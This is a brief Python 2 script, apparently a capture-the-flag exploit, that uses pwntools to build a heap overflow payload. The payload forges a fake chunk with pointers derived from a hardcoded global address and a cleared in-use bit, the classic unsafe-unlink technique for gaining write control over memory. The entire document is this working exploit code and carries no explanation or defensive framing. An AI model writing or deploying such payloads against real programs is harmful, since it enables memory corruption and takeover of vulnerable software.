from pwn import *

addr_heap  = 0x0804b000
addr_chunk = 0x0804a02c

payload  = ""
payload += "\x00"*8
payload += p32(addr_chunk-3*4)
payload += p32(addr_chunk-2*4)
payload += "\x00"*(0x80-16)
payload += p32(0x80)
payload += p32(0x89 & ~1)
payload += '\n'
payload += 'A'*0x100
print payload